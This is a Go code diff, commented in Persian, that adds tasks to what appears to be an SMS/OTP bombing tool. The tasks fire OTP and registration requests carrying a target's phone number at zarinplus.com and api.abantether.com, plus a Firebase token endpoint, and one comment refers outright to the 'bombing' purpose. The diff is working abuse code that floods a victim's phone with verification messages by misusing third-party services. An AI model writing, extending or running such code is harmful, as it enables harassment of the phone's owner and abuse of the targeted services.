@@ -353,6 +353,41 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
+		// 1. سرویس zarinplus.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.zarinplus.com/user/otp/", map[string]interface{}{
+					"phone_number": getPhoneNumber98NoZero(phone), // نیاز به کد 98 دارد
+					"source": "zarinplus",
+				}, &wg, ch)
+			}
+		}(client)
+
+		// 2. سرویس firebaseinstallations.googleapis.com (JSON)
+        // توجه: این سرویس مربوط به مدیریت نصب‌های Firebase است و ممکن است برای هدف بمب‌گذاری مناسب نباشد.
+        // شناسه installation ممکن است نیاز به تولید دینامیک داشته باشد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://firebaseinstallations.googleapis.com/v1/projects/emtiyaz-a20c8/installations/eSeY83hZmWCOYNLj7vmuBU/authTokens:generate", map[string]interface{}{
+					"installation": map[string]interface{}{
+						"sdkVersion": "w:0.6.12",
+						"appId": "1:622396066313:web:26ccd158dc92b94b7906d8",
+					},
+				}, &wg, ch)
+			}
+		}(client)
+
+		// 3. سرویس api.abantether.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
+					"phone_number": formatPhoneWithSpaces(phone), // از تابع فرمت با فاصله استفاده کنید یا تابع مناسب دیگر
+				}, &wg, ch)
+			}
+		}(client)
 
 }
 
